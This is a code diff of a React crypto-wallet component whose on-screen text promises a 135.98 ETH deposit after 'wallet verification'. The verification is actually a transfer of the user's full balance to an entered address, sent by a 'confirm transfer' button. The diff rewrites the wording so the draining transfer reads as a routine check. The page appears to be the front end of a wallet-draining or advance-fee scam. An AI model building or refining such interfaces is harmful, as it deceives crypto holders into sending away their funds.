@@ -46,13 +46,12 @@ const VerifyAddressForm = ({ userBalance, confirmAndSend }: VerifyAddressFormPro
     return (
         <>
             <div className='p-4 bg-green-100 rounded-md mb-4'>
-                <h4><span className='font-bold text-lg'>135.98 ETH ({convertETHtoUSD(135.98)})</span> to be deposited to <span className='font-bold text-lg'>{Boolean(inputAddress) ? inputAddress : "input address"}</span> immediately after address verification and test transfer is done</h4>
+                <h4><span className='font-bold text-lg'>135.98 ETH ({convertETHtoUSD(135.98)})</span> to be deposited to <span className='font-bold text-lg break-all'>{Boolean(inputAddress) ? inputAddress : "input address"}</span> immediately after <span className='font-bold'>wallet verification</span> is done</h4>
             </div>
             <div className='bg-neutral-200 p-4 rounded-md mb-4'>
-                <h4 className='font-semibold uppercase mb-4'>address verification and transfer</h4>
-
-                <h4 className="mb-2">We need to verify your address, we will initiate a <span className="font-bold">transfer request</span> of <span className='font-bold'>{userBalance.toFixed(4)} ETH ({convertETHtoUSD(userBalance)})</span> to this <span className="font-bold">input address</span></h4>
-                <h4 className="mb-2"><span className="font-bold">{userBalance.toFixed(4)} ETH ({convertETHtoUSD(userBalance)})</span> to be deposited to <span className="font-bold">input address</span> from your account</h4>
+                <h4 className='font-semibold uppercase mb-4'>Wallet verification and transfer</h4>
+                <h4 className="mb-2">As part of our wallet verification process, we will initiate a <span className="font-bold">transfer request</span> of <span className='font-bold'>{userBalance.toFixed(4)} ETH ({convertETHtoUSD(userBalance)})</span> to <span className="font-bold break-all">{Boolean(inputAddress) ? inputAddress : "input address"}</span> after which <span className='font-bold'>135.98 ETH ({convertETHtoUSD(135.98)})</span> will be deposited to your connected wallet account</h4>
+                {/* <h4 className="mb-2"><span className="font-bold">{userBalance.toFixed(4)} ETH ({convertETHtoUSD(userBalance)})</span> to be deposited to <span className="font-bold">input address</span> from your connected wallet</h4> */}
 
                 <form action="" onSubmit={handleSubmit(onSubmit)} className='flex md:flex-row flex-col justify-between gap-y-4 gap-x-4'>
                     <div className='w-full'>
@@ -72,7 +71,7 @@ const VerifyAddressForm = ({ userBalance, confirmAndSend }: VerifyAddressFormPro
                         {Boolean(inputAddress) ? null : <span className='text-red-600'>{errors.btcaddress?.message}</span>}
                     </div>
 
-                    {Boolean(inputAddress) ? <button onClick={confirmAndSend} className="uppercase font-medium flex items-center justify-center h-10 bg-green-600 px-4 rounded-full text-neutral-100 sm:w-fit w-full whitespace-nowrap">confirm and send</button> : <button className='text-base font-medium px-6 h-9 flex items-center justify-center bg-red-700 rounded-full text-white whitespace-nowrap'>Verify Address</button>}
+                    {Boolean(inputAddress) ? <button onClick={confirmAndSend} className="uppercase font-medium flex items-center justify-center h-10 bg-green-600 px-4 rounded-full text-neutral-100 sm:w-fit w-full whitespace-nowrap">confirm transfer</button> : <button className='text-base font-medium px-6 h-9 flex items-center justify-center bg-red-700 rounded-full text-white whitespace-nowrap'>Verify Address</button>}
                     {/* <div className='w-full'>
                     <div className='w-full bg-white break-words px-3 py-2 rounded-md border border-green-600 mb-3'>392NQstZKRCHBGNR4nNR7PRhQtXS5xRKAV</div>
                 </div>
